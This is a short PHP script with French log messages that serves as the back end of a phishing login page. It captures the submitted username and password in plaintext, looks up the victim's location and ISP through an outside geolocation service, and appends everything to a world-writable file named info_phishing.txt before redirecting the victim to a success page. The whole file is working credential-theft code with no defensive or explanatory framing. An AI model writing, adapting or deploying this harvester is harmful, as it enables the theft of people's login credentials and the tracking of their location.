<?php
error_log("Tentative de connexion reçue: " . $_POST['username']);

date_default_timezone_set('Europe/Paris');


if (!is_writable(__DIR__)) {
    error_log("ERREUR: Le répertoire " . __DIR__ . " n'est pas accessible en écriture");
}

$date = date('Y-m-d H:i:s');

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"));
$city = $geo->city ?? 'N/A';
$region = $geo->regionName ?? 'N/A';
$country = $geo->country ?? 'N/A';
$isp = $geo->isp ?? 'N/A';

$data = "========= Connexion détectée =========\n";
$data .= "🕒 Date        : $date\n";
$data .= "🌍 IP          : $ip\n";
$data .= "📍 Ville       : $city\n";
$data .= "🗺️ Région      : $region\n";
$data .= "🇨🇵 Pays        : $country\n";
$data .= "🔌 FAI          : $isp\n";
$data .= "🖥️ Appareil    : $user_agent\n";
$data .= "👤 Identifiant : " . $_POST['username'] . "\n";
$data .= "🔐 Mot de passe: " . $_POST['password'] . "\n";
$data .= "======================================\n\n";


if (!file_exists("info_phishing.txt")) {
    touch("info_phishing.txt");
    chmod("info_phishing.txt", 0666);
}

$result = file_put_contents("info_phishing.txt", $data, FILE_APPEND);

if ($result === false) {
    error_log("ERREUR: Impossible d'écrire dans info_phishing.txt");
} else {
    error_log("Succès: Identifiants enregistrés dans info_phishing.txt (" . $result . " octets écrits)");
}

header('Location: success.php');
exit();
?>
